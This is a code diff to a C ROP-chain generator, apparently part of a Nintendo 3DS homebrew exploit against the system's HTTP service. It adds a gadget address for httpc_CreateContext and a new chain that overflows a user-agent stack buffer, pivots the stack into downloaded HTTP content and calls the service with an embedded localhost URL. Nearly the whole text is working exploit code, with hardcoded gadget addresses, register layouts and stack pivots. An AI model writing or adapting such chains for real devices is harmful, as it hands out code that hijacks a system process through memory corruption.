@@ -54,9 +54,13 @@ u32 ROP_MOVR1R0_BXLR = 0x0013b23d;//"mov r1, r0" "bx lr"
 
 u32 ROP_ADDR0R0R3_POPR2R3R4R5R6PC = 0x00104eb1;//"adds r0, r0, r3" "pop {r2, r3, r4, r5, r6, pc}"
 
+u32 ROP_httpc_CreateContext = 0x001212d9;//inr0=_this inr1=url* inr2=u8 reqmethod inr3=flag. When flag is non-zero, use SetProxyDefault.
+
 u32 contentdatabuf_addr = 0x08032c00;//Unused memory near the end of the heap.
 
 u32 ropvaddr_end = 0;
+
+u32 ropheap = 0x0fffe000;
 
 //From ctrtool.
 void putle32(u8* p, u32 n)
@@ -73,7 +77,7 @@ void ropgen_addword(u32 **ropchain, u32 *ropvaddr, u32 value)
 
 	if(ropvaddr_end <= *ropvaddr)
 	{
-		printf("ROP-chain is too large.\n");
+		printf("ROP-chain is too large: ropvaddr_end=0x%08x ropvaddr=0x%08x.\n", ropvaddr_end, *ropvaddr);
 		exit(9);
 	}
 
@@ -90,7 +94,7 @@ void ropgen_addwords(u32 **ropchain, u32 *ropvaddr, u32 *buf, u32 total_words)
 
 	if(ropvaddr_end <= *ropvaddr || (ropvaddr_end < ((*ropvaddr) + total_words*4)))
 	{
-		printf("ROP-chain is too large.\n");
+		printf("ROP-chain is too large: ropvaddr_end=0x%08x ropvaddr=0x%08x.\n", ropvaddr_end, *ropvaddr);
 		exit(9);
 	}
 
@@ -233,46 +237,70 @@ void ropgen_callfunc(u32 **ropchain, u32 *ropvaddr, u32 funcaddr, u32 *params)//
 	ropgen_blxr4_popr1r2r3r4r5r6r7pc(ropchain, ropvaddr, funcaddr, &params[4]);
 }
 
-void buildrop_config(u32 *ropchain, u32 ropchain_maxsize)
+void buildrop_config(u32 *ropchain, u32 *ropvaddr, u32 ropchain_maxsize)
 {
-	u32 ropvaddr = 0x0803b7f8-0xa4;
 	u32 ua[0x80>>2];
 
 	u32 stack_contentbufsize_ptr = 0x803b874;
 	u32 stack_recvdata_timeoutptr = 0x803b8b8;
-
-	ropvaddr_end = ropvaddr+ropchain_maxsize;
 
 	//This ropchain buffer starts with the user-agent. The UA has 0x80-bytes allocated on stack, with the saved registers immediately following that. The sysmodule v13314 function for this is LT_121350.
 
 	memset(ua, 0, sizeof(ua));
 	strncpy((char*)ua, "PBOS-8.0/0000000000000000-0000000000000000/00.0.0-00X/00000/0", sizeof(ua)-1);
 
-	ropgen_addwords(&ropchain, &ropvaddr, ua, 0x80>>2);
+	ropgen_addwords(&ropchain, ropvaddr, ua, 0x80>>2);
 
 	//r0-r3 are not popped from stack during return.
-	ropgen_addword(&ropchain, &ropvaddr, 0);//r0
-	ropgen_addword(&ropchain, &ropvaddr, 0);//r1
-	ropgen_addword(&ropchain, &ropvaddr, 0);//r2
-	ropgen_addword(&ropchain, &ropvaddr, contentdatabuf_addr);//r3, output content data addr for httpc_ReceiveDataTimeout.
+	ropgen_addword(&ropchain, ropvaddr, 0);//r0
+	ropgen_addword(&ropchain, ropvaddr, 0);//r1
+	ropgen_addword(&ropchain, ropvaddr, 0);//r2
+	ropgen_addword(&ropchain, ropvaddr, contentdatabuf_addr);//r3, output content data addr for httpc_ReceiveDataTimeout.
 
-	ropgen_addword(&ropchain, &ropvaddr, 0x34343434);//r4
-	ropgen_addword(&ropchain, &ropvaddr, 0x35353535);//r5
-	ropgen_addword(&ropchain, &ropvaddr, 0x36363636);//r6
-	ropgen_addword(&ropchain, &ropvaddr, 0x37373737);//r7
+	ropgen_addword(&ropchain, ropvaddr, 0x34343434);//r4
+	ropgen_addword(&ropchain, ropvaddr, 0x35353535);//r5
+	ropgen_addword(&ropchain, ropvaddr, 0x36363636);//r6
+	ropgen_addword(&ropchain, ropvaddr, 0x37373737);//r7
 
 	//pc for the initial reg-pop is here. The data starting at r4 below is also used by the target function as insp0, which has to be valid otherwise it won't download the content properly/crash.
 
-	ropgen_popr4r5r6r7r8pc(&ropchain, &ropvaddr, 0x0, stack_contentbufsize_ptr, stack_recvdata_timeoutptr, 0x0);
+	ropgen_popr4r5r6r7r8pc(&ropchain, ropvaddr, 0x0, stack_contentbufsize_ptr, stack_recvdata_timeoutptr, 0x0);
 
-	ropgen_stackpivot(&ropchain, &ropvaddr, contentdatabuf_addr);//Stack-pivot to the http content data downloaded by the targeted function.
+	ropgen_stackpivot(&ropchain, ropvaddr, contentdatabuf_addr);//Stack-pivot to the http content data downloaded by the targeted function.
 }
 
-void buildrop_http(u32 *ropchain, u32 ropchain_maxsize)
+void buildrop_http(u32 *ropchain, u32 *ropvaddr, u32 ropchain_maxsize)
 {
-	u32 ropvaddr = contentdatabuf_addr;
+	u32 *ropchain0, ropvaddr0;
 
-	ropvaddr_end = ropvaddr+ropchain_maxsize;
+	u32 httpctx = ropheap+0x0;
+	u32 urladdr;
+
+	u32 params[11];
+	u32 urlbuf[(0x28+0x40)>>2];//The +0x40 is needed to avoid corruption on stack.
+
+	//Embed the URL in the ropchain data.
+	memset(urlbuf, 0, sizeof(urlbuf));
+	strncpy((char*)urlbuf, "http://localhost/ctr-httpwn/cmdhandler", sizeof(urlbuf)-1);
+
+	ropchain0 = ropchain;
+	ropvaddr0 = *ropvaddr;
+	ropgen_stackpivot(&ropchain, ropvaddr, 0);
+	urladdr = *ropvaddr;
+	ropgen_addwords(&ropchain, ropvaddr, urlbuf, sizeof(urlbuf)>>2);
+
+	ropgen_stackpivot(&ropchain0, &ropvaddr0, *ropvaddr);
+
+	memset(params, 0, sizeof(params));
+
+	params[0] = httpctx;//r0 = _this
+	params[1] = urladdr;//r1 = url
+	params[2] = 1;//r2 = reqmethod (GET)
+	params[3] = 1;//r3 = defaultproxy flag
+
+	ropgen_callfunc(&ropchain, ropvaddr, ROP_httpc_CreateContext, params);
+
+	ropgen_addword(&ropchain, ropvaddr, 0x20202020);
 }
 
 int main(int argc, char **argv)
@@ -287,6 +315,8 @@ int main(int argc, char **argv)
 	char *configout = NULL;
 	u32 configout_size = 0x400;
 	u32 ropchain_maxsize = 0x1000;
+	u32 ropvaddr=0;
+	u32 ropvaddr_start=0;
 
 	char *url = NULL, *new_url = NULL;
 	char config_hexdata[0x200];
@@ -384,8 +414,20 @@ int main(int argc, char **argv)
 
 	if(output_type==0)ropchain_maxsize = 0xbc;
 
-	if(output_type==0)buildrop_config(ropchain, ropchain_maxsize);
-	if(output_type==1)buildrop_http(ropchain, ropchain_maxsize);
+	if(output_type==0)
+	{
+		ropvaddr_start = 0x0803b7f8-0xa4;
+		ropvaddr = ropvaddr_start;
+		ropvaddr_end = ropvaddr+ropchain_maxsize;
+		buildrop_config(ropchain, &ropvaddr, ropchain_maxsize);
+	}
+	if(output_type==1)
+	{
+		ropvaddr_start = contentdatabuf_addr;
+		ropvaddr = ropvaddr_start;
+		ropvaddr_end = ropvaddr+ropchain_maxsize;
+		buildrop_http(ropchain, &ropvaddr, ropchain_maxsize);
+	}
 
 	if(output_type==0)
 	{
@@ -395,6 +437,11 @@ int main(int argc, char **argv)
 
 		snprintf(configout, configout_size-1, configxml_formatstr, url, new_url, config_hexdata);
 		fprintf(fout, "%s", configout);
+	}
+
+	if(output_type==1)
+	{
+		fwrite(ropchain, 1, ropvaddr-ropvaddr_start, fout);
 	}
 
 	if(output_type==0)free(configout);
